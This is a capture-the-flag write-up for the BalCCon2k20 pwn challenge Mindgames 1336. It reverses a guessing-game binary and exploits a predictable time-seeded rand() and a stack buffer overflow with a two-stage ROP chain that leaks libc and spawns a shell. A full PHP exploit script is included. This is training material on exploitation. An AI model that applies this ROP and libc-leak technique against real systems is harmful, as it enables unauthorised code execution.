# Mindgames 1336 - BalCCon2k20 CTF (pwn, 443p, 14 solved)
## Introduction

Mindgames 1336 is a pwn task. This is the first challenge of the Mindgames serie
(Mindgames 1336, 1337, 1338). This challenge has no protections.

A Linux ELF file is provided. It is a guessing game. The highest score belongs
to a randomly generated Star Wars character, but can be replaced by the user's
name.

## Reverse engineering

The binary starts by doing the usual CTF dance :
```c
signal(SIGALRM, timeout);
alarm(20);

setvbuf(stderr, NULL, _IONBF, 0);
setvbuf(stdin,  NULL, _IONBF, 0);
setvbuf(stdout, NULL, _IONBF, 0);
```

Then, the binary seeds the libc's PRNG with the current time. It displays it to
the user :
```c
time(&t);
strftime(buffer, sizeof(buffer), "%Y-%m-%d %H:%M:%S", localtime(&t));

printf("Hello there! It's %s and the weather looks pretty nice!\n\n", buffer);
srand(t);
```

The current high score and player name is generated with calls to `rand()` :
```c
player    = characters[rand() % 6];
highScore = (rand() % 32) + 1;
```

The player can then check the high score, or play the game.
The game consists of guessing the output of `rand` :
```c
printf("Can you guess my numbers?\n> ");

while(1) {
	r = rand();
	scanf("%d", &guess);

	if(r != guess)
		break;

	printf("You were lucky this time!\n>");
	score++;
}
```

If the user's score is higher or equal to the current high score, they can put
their name on the leaderboard :
```c
puts("Game over!");

if(highScore < score) {
	puts("New Highscore! Amazing!");
	highScore = score;
	newHS();
}
```

The function that reads the user's name reads `0x400` bytes from the standard
input to a buffer on the stack of size `0x110`. This buffer is then copied to a
global buffer of size `0x20`.

## Exploitation

The vulnerability is pretty obvious here : the high score function has a
stack-based buffer overflow. This binary has no protection (except for NX).
In particular, this binary has no stack canary and is not position-independant.
This means the binary can be attacked using ROP.

There are no `syscall` gadgets to be found in the binary. The most
straightforward way is to use a 2-stage chain that will leak the libc's address
and call `system("/bin/sh")`.

The following ROP chain will call `puts(__libc_start_main@got.plt)` and jump
back to `newHS` to read a second stage.

```php
POPRDI = 0x004015c3;
PUTS   = 0x00401040;
NEWHS  = 0x00401336;

$chain = [
	POPRDI, 0x00403fe8,
	PUTS,
	NEWHS,
];
```

## Retrieval of libc

The libc that is used to run this specific challenge was not given.

Smart players would try to reuse other challenge's libc, try common
distributions' libc, or leak multiple addresses to use libc DB.

Unfortunately, the author of this writeup is not a smart player.

### libc base address

ELF files always start with a magic : `\x7FELF`.

They are also page-aligned. This means the last 12 bits (3 last nibbles) are set
to 0. The `__libc_start_main` function is usually quit early in the libc :
around `0x20000`

It is possible to find the libc's base address with only a few tries :
1. leak address of `__libc_start_main`
2. clear the least significant 12 bits
3. substract `0x20000`
4. read address (using `puts` for example)
5. if the 4 first bytes are `\x7FELF`, this is the base address
6. substract `0x1000` and go to 4

`__libc_start_main` is at `base + 0x00023fb0`.


### libc version

The glibc can be executed. It prints the exact version and exits.
```sh
$ /usr/lib/libc.so.6
GNU C Library (GNU libc) release release version 2.32.
Copyright (C) 2020 Free Software Foundation, Inc.
[...]
```

The entrypoint of an ELF file is located at `base + 0x18` :

```sh
$ readelf -h /bin/sh | fgrep Entry
  Entry point address:               0x208b0

xxd -g 8 -e /bin/sh | head
00000000: 00010102464c457f 0000000000000000  .ELF............
00000010: 00000001003e0003 00000000000208b0  ..>.............
00000020: 0000000000000040 00000000000e22d0  @........"......
00000030: 0038004000000000 001800190040000b  ....@.8...@.....
00000040: 0000000400000006 0000000000000040  ........@.......
00000050: 0000000000000040 0000000000000040  @.......@.......
00000060: 0000000000000268 0000000000000268  h.......h.......
00000070: 0000000000000008 0000000400000003  ................
00000080: 00000000000002a8 00000000000002a8  ................
00000090: 00000000000002a8 000000000000001c  ................
```

(More information about the ELF file format can be found on the elf(5) man page)

The payload to leak the libc is :
```php
$libc  = puts(0x00403fe8); // __libc_start_main@got.plt
$libc  = $libc - 0x00023FB0;

$entry = puts($libc + 0x18);
call($libc + $entry);
```

This shows the following text, which tells that the libc is Debian's 2.28-10 :
```
GNU C Library (Debian GLIBC 2.28-10) stable release version 2.28.
Copyright (C) 2018 Free Software Foundation, Inc.
This is free software; see the source for copying conditions.
There is NO warranty; not even for MERCHANTABILITY or FITNESS FOR A
PARTICULAR PURPOSE.
Compiled by GNU CC version 8.3.0.
libc ABIs: UNIQUE IFUNC ABSOLUTE
For bug reporting instructions, please see:
<http://www.debian.org/Bugs/>.
```

## Getting a shell

With the libc in hand, it becomes straightforward to just call
`system("/bin/sh")` :

```php
$chain = [
	POPRDI, $libc + BINSH,
	$libc + SYSTEM,
];
```


**Flag**: `BCTF{I_guess_time_was_0n_y0ur_side_this_time}`

## Appendices
### pwn.php

```php
#!/usr/bin/php
<?php // vim: filetype=php
require_once "/mnt/ctf/tools/pwn/phplib/tubes/Socket.php";

const POPRDI = 0x004015c3;
const PUTS   = 0x00401040;

const BINSH  = 0x00181519;
const SYSTEM = 0x000449c0;

const HOST = "pwn.institute";
const PORT = 41336;

printf("[*] Creating process\n");
$time = microtime(true);

$t = new Socket(HOST, PORT);
$date = strftime("%Y-%m-%d %H:%M:%S"); // it's okay because we use NTP ;-)
$t->expectLine("Hello there! It's $date and the weather looks pretty nice!");

//$t->expect("Hello there! It's ");
//$date = $t->read(strlen("2020-09-25 21:26:35"));
//$t->expectLine(" and the weather looks pretty nice!");

$t->expectLine("");
$t->expectLine("");
$t->expectLine("We should play a game of the mind!");
$t->expect("> ");

$ffi = FFI::load("rand.h");

printf("[+] Done in %f seconds\n", microtime(true) - $time);
printf("\n");

$time = strtotime($date);
$ffi->srand($time);
$ffi->rand(); // player
$ffi->rand(); // score

$t->expectLine("What do you want to do?");
$t->expectLine(" 1) Show Highscore");
$t->expectLine(" 2) Play the game");
$t->expectLine(" 3) Exit");
$t->expect("> ");
$t->write("2\n");

$t->expectLine("Can you guess my numbers?");
$t->expect("> ");

for($i = 0; $i < 50; $i++) {
	$guess = $ffi->rand();
	$t->write("$guess\n");
}

for($i = 0; $i < 50; $i++) {
	$t->expectLine("You were lucky this time!");
	$t->expect(">");
}

$t->write("-1\n");
$t->expectLine("Game over!");
$t->expectLine("New Highscore! Amazing!");

/* Leak */

$payload  = str_repeat("x", 0x110);
$payload .= pack("Q", 0xdeadbeef); // rbp
$payload .= pack("Q*",
	POPRDI, 0x00403fe8,
	PUTS,
	0x00401336, // stage 2
); // rip

$t->expect("Give me your name: ");
$t->write($payload);

$leak = $t->readLine();
$leak = str_pad(substr($leak, 0, 8), 8, "\x00");
$addr = unpack("Q", $leak)[1];

$libc  = $addr & ~0xFFF;
$libc -= 0x23000;

// vvv leak vvv
// /* stage 2 */
//
// $payload  = str_repeat("x", 0x110);
// $payload .= pack("Q", 0xdeadbeef); // rbp
// $payload .= pack("Q*",
// 	POPRDI, $libc + 0x18,
// 	PUTS,
// 	0x00401336, // stage 2
// ); // rip
//
// $t->expect("Give me your name: ");
// $t->write($payload);
//
// $leak = $t->readLine();
// $leak = str_pad(substr($leak, 0, 8), 8, "\x00");
// $entry = unpack("Q", $leak)[1];
// printf("Entry : %X\n", $entry);
//
// /* stage 3 */
//
// $payload  = str_repeat("x", 0x110);
// $payload .= pack("Q", 0xdeadbeef); // rbp
// $payload .= pack("Q*",
// 	$libc + $entry,
// ); // rip
//
// $t->expect("Give me your name: ");
// $t->write($payload);

$payload  = str_repeat("x", 0x110);
$payload .= pack("Q", 0xdeadbeef); // rbp
$payload .= pack("Q*",
	POPRDI, $libc + BINSH,
	$libc + SYSTEM,
	-1,
); // rip

$t->expect("Give me your name: ");
$t->write($payload);

printf("[!] shell\n");
$t->pipe();
```
